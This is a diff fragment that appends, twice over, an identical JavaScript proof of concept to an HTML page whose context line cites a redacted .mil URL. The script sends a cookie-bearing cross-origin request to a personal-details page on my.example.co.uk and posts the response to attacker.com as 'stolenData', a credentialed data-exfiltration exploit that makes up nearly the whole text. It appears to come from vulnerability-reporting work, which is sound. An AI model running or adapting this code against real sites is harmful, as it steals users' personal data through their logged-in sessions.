@@ -17,3 +17,45 @@ https://███████.███████.mil/kc/main/pop_up_frm.asp?l
     </form>
   </body>
 </html>
+
+<script>
+    var target = "https://my.example.co.uk/PlanReviewAct/PersonalDetailsConfirm.asp"; // Target URL
+
+    // Sending a malicious cross-origin request
+    fetch(target, {
+        method: "GET",
+        credentials: "include" // Allows cookies to be sent
+    })
+    .then(response => response.text()) 
+    .then(data => {
+        // Send the stolen data to the attacker's server
+        fetch("https://attacker.com/log", {
+            method: "POST",
+            headers: { "Content-Type": "application/json" },
+            body: JSON.stringify({ stolenData: data })
+        });
+    })
+    .catch(err => console.log("Exploit failed", err));
+</script>
+
+
+<script>
+    var target = "https://my.example.co.uk/PlanReviewAct/PersonalDetailsConfirm.asp"; // Target URL
+
+    // Sending a malicious cross-origin request
+    fetch(target, {
+        method: "GET",
+        credentials: "include" // Allows cookies to be sent
+    })
+    .then(response => response.text()) 
+    .then(data => {
+        // Send the stolen data to the attacker's server
+        fetch("https://attacker.com/log", {
+            method: "POST",
+            headers: { "Content-Type": "application/json" },
+            body: JSON.stringify({ stolenData: data })
+        });
+    })
+    .catch(err => console.log("Exploit failed", err));
+</script>
+
